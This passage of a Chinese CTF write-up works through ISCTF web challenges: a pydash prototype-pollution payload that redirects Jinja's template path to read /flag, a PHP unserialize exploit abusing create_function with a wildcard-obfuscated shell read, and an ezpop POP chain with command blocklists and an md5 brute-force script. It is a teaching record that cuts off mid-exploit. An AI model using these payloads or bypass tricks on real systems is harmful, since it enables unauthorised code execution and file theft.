function_">logout</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    old_password=request.form[<span class="string">&#x27;old_password&#x27;</span>]</span><br><span class="line">    new_password=request.form[<span class="string">&#x27;new_password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">in</span> database <span class="keyword">and</span> database[user] == old_password:</span><br><span class="line">        database[user]=new_password</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;密码修改成功，请重新登录。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;密码修改失败，请确认旧密码是否正确。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/user_dashboard&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="built_in">type</span>=request.form[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> database <span class="keyword">and</span> database[username] != password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;用户名或密码错误请重新输入。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> username <span class="keyword">not</span> <span class="keyword">in</span> database:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;用户名或密码错误请重新输入。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> name</span><br><span class="line">        name=username</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;user_dashboard&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;A272e1739b89da32e983970ece1a086bd&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8080</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>关键部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br></pre></td></tr></table></figure><p>这里肯定是无法直接ssti的，于是转向&#x2F;oprate，这里就是<code>pydash.set_</code>的一个原型链污染</p><p><a href="https://rycarl.cn/index.php/2025/05/08/pydash%E4%B8%AD%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Pydash中的原型链污染 - Rycarls little blog</a></p><p>但是<code>username in globals()</code>头子必须是在这个里面，<code>globals()</code> 是 Python 内置的一个函数，它返回一个表示当前全局符号表的字典！这里可以是app，一开是想去污染静态目录，但是<code>old</code>不能用，然后我们这里可以去污染默认渲染路径</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/operate?username=app&amp;password=jinja_loader.searchpath&amp;confirm_password=/</span><br><span class="line">/impression?point=flag</span><br></pre></td></tr></table></figure><p>就直接去&#x2F;下去渲染flag文件，拿到flag</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>给出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$a</span>.<span class="variable">$b</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">            <span class="variable">$b</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">                <span class="variable">$a</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Try again!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$blocked_a</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;escape&#x27;</span>, <span class="string">&#x27;er&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;ay&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;open&#x27;</span>];</span><br><span class="line">        <span class="variable">$blocked_b</span> = [<span class="string">&#x27;find&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;pa&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;alter&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;sy&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pattern_a</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_a</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern_b</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_b</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_a</span>, <span class="variable">$a</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_b</span>, <span class="variable">$b</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$p</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应该是改编BUGKU-web的unserialize-Noteasy，基本上就多了些过滤。</p><p>主要是这个玩意$a(“”,$b);你得找一个函数接受第一个参数为空的，这里利用create_function的特性（<a href="https://www.cnblogs.com/zzjdbk/p/12980483.html">PHP代码审计之create_function()函数 - My_Dreams - 博客园</a>）</p><p>函数的第一个参数为变量声明，第二个参数为执行代码部分！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>);本质上是创建并调用了一个匿名函数：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda_1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这里b可控的话，我们就可以考虑闭合逃逸，b的话用var_dump(<code>/bi?/?a? /?lag</code>);</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>(<span class="string">&quot;create_function&quot;</span>,<span class="string">&quot;2;&#125;var_dump(`/bi?/?a? /?lag`);/*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;var2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">starlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;var4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">anna</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;var6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;var7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;yamada yamada&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;</span>, <span class="variable">$this</span>-&gt;command))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var11</span>=<span class="string">&quot;1145141919810&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;var10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ISCTF&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一点是md5(md5($this-&gt;var11)) &#x3D;&#x3D; 666这个的爆破，因为是弱比较</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 随机生成一个字符串（你也可以固定一个前缀）</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">    h1 = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">    h2 = hashlib.md5(h1.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> h2.startswith(<span class="string">&quot;666&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;FOUND!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;var11 =&quot;</span>, s)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;md5(var11) =&quot;</span>, h1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;md5(md5(var11)) =&quot;</span>, h2)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这题的exp还在，空格过滤用%09（记得把payload里面的空格换成%09）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 